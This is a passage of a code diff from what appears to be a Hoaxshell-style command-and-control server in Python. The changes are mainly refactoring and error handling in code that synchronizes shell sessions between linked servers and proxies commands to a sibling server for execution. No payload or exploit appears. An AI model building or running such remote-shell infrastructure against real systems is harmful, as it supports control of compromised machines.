+		Core_server.sibling_servers[sibling_id]['Server IP'], Core_server.sibling_servers[sibling_id]['Server Port'], \
+		
+		encode_msg = False, timeout = timeout)
 		
 		if encapsulated_response_data_encrypted not in ['connection_refused', 'timed_out']:
-			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
+			
+			encapsulated_response_data_decrypted = decrypt_msg(sibling_id.encode('utf-8'), \
+			encapsulated_response_data_encrypted, server_unique_id[0:16].encode('utf-8'))
+			
 			decapsulated_response_data = Core_server.decapsulate_dict(encapsulated_response_data_decrypted) # returns [capsule, received_data]
 			return decapsulated_response_data
 		
@@ -1508,18 +1582,20 @@ class Core_server:
 	def synchronize_sibling_servers(self):
 		
 		print('\rSynchronizing servers...')
+		sibling_servers = clone_dict_keys(self.sibling_servers)	
 		
-		for sibling_id in self.sibling_servers.keys():
+		for sibling_id in sibling_servers:
 			
-			#print(f'Synching with {sibling_id}')
-			# Sync sibling servers table
-			#print(f'sending {self.sibling_servers}')
-			remote_siblings_data = Core_server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'synchronize_sibling_servers_table')
-			#print(f' received: {remote_siblings_data[1]}')
-			self.update_siblings_data_table(remote_siblings_data[1])
+			remote_siblings_data = Core_server.send_receive_one_encrypted(sibling_id, \
+			self.sibling_servers, 'synchronize_sibling_servers_table')
+			
+			if isinstance(remote_siblings_data, dict):
+				self.update_siblings_data_table(remote_siblings_data[1])
 			
 			# Sync sibling servers shell sessions
-			remote_shells = Core_server.send_receive_one_encrypted(sibling_id, Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
+			remote_shells = Core_server.send_receive_one_encrypted(sibling_id, \
+			Sessions_manager.active_sessions, 'synchronize_sibling_servers_shells')
+			
 			self.update_shell_sessions(remote_shells[1])			
 
 			if not self.ping_sibling_servers:
@@ -1528,7 +1604,7 @@ class Core_server:
 				siblings_status_monitor.start()	
 			
 		print('\rSynchronized!')
-		Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
+		Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 
 
 
@@ -1561,7 +1637,7 @@ class Core_server:
 			
 		# Init connect
 		if authorized:
-			
+			print('Sending request to connect...')
 			response = self.send_receive_one(self.CONNECT_SYN, server_ip, server_port, encode_msg = False, timeout = 11)
 			
 			if response == 'connection_refused':
@@ -1579,7 +1655,7 @@ class Core_server:
 				sibling_hostname = tmp[1]
 
 				if is_valid_uuid(sibling_id):
-					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : f'Active'}
+					self.sibling_servers[sibling_id] = {'Hostname': sibling_hostname, 'Server IP' : server_ip, 'Server Port' : server_port, 'Status' : 'Active'}
 						
 				else:
 					print(f'\r[{FAILED}] Connection request failed.')
@@ -1601,9 +1677,9 @@ class Core_server:
 	def proxy_cmd_for_exec_by_sibling(sibling_id, session_id, command):
 		
 		# Check again if server in siblings
-		if not sibling_id in Core_server.sibling_servers.keys():
+		if sibling_id not in Core_server.sibling_servers.keys():
 			print('\rFailed to proxy the command. Connection with the sibling server may be lost.')
-			Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
+			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 			return
 		
 		# Send command to sibling
@@ -1632,9 +1708,16 @@ class Core_server:
 			
 			else:
 				
-				for sibling_id in siblings:					
-					response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive')
-					self.sibling_servers[sibling_id]['Status'] = f'Unreachable' if response in ['connection_refused', 'timed_out'] else f'Active'				
+				for sibling_id in siblings:
+					
+					try:				
+						response = Core_server.send_receive_one_encrypted(sibling_id, {0 : 0}, 'are_you_alive')
+						
+						self.sibling_servers[sibling_id]['Status'] = f'Unreachable' \
+						if response in ['connection_refused', 'timed_out'] else f'Active'
+					
+					except KeyError:
+						pass
 			
 			sleep(5)
 
